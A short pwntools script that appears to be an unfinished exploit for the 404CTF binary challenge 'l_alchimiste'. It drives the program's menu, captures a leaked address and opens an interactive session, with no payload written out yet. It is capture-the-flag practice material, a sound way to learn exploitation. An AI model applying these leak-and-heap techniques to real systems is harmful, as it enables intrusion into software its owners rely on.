#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("./l_alchimiste")

r = process([exe.path])
#r = remote("challenges.404ctf.fr", 30944)
#gdb.attach(r)

        
def malloc():
	r.sendlineafter(b">>> ", b"3", timeout=1)
	r.sendlineafter(b"[Vous] : ", b"", timeout=1)

def buy_elixir():
	r.sendlineafter(b">>> ", b"1", timeout=1)

def main():
	buy_elixir()
	r.recvuntil(b"***** ~ ")
	leak = r.recvline().rstrip().ljust(8, b"\x00")
	r.interactive()


if __name__ == "__main__":
    main()
